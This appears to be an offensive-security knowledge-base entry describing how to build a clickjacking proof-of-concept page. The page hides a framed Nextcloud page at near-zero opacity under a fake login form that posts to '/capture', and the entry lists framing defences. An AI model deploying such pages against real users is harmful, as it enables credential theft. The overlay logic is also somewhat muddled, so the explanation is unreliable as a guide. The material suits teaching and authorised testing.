---
tags:
  - clickjacking
  - poc
  - html
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:28:12.409Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: a86215dd-9a57-46ea-8537-69966fde9c24
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Create-Clickjacking-Proof-of-Concept-HTML

## Summary

This procedure constructs a simple HTML page that embeds a vulnerable Nextcloud subdomain in a nearly invisible iframe, overlaid with attacker-controlled elements to demonstrate potential hijacking of user clicks or keystrokes.

## Description

Clickjacking relies on transparent or obscured iframes to trick users into interacting with hidden content. Using CSS for low opacity (0.0001), relative positioning, fixed dimensions (500x700px), and z-index layering, this PoC makes the embedded Nextcloud page invisible while overlaying fake forms (e.g., for credential capture). It's used in scenarios where users visit a malicious site, unknowingly performing actions on the embedded legitimate site.

## Requirements

1. Text editor (e.g., Notepad++, VS Code)
2. Knowledge of HTML/CSS basics
3. Identified vulnerable URL from prior reconnaissance

## Defense

Defensive measures and detection strategies:

- Enforce X-Frame-Options header to block embedding
- Implement CSP with frame-ancestors directive to restrict iframe sources
- Educate users on phishing risks and use browser protections like SmartScreen

## Objectives

1. Build embeddable iframe for vulnerable site
2. Style for invisibility and overlay functionality
3. Prepare for verification of attack success

## Instructions

### Step 1: Write Base HTML Structure

**Context**: Create the core HTML with an iframe sourcing the vulnerable URL.

**Command** (Manual HTML creation):
```html
<!DOCTYPE html>
<html>
<body>
  <iframe src="https://nextcloud.com" width="500" height="700"></iframe>
</body>
</html>
```

> Start with this skeleton, ensuring the src points to a confirmed vulnerable subdomain.

### Step 2: Apply CSS for Invisibility and Overlay

**Context**: Style the iframe to be nearly transparent and add an overlay div for attacker elements.

**Command** (Inline CSS in HTML):
```html
<div style="position: absolute; top: 0; left: 0; width: 500px; height: 700px; opacity: 0.0001; z-index: 1;">
  <iframe src="https://nextcloud.com" style="position: relative;"></iframe>
</div>
<div style="position: absolute; top: 0; left: 0; width: 500px; height: 700px; z-index: 2;">
  <form action="/capture">Fake Login: <input type="text"> <input type="password"> <button>Click Me</button></form>
</div>
```

> Low opacity hides the iframe; higher z-index overlay captures clicks. Save as poc.html.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[ui-redressing]]
- [[html-poc]]
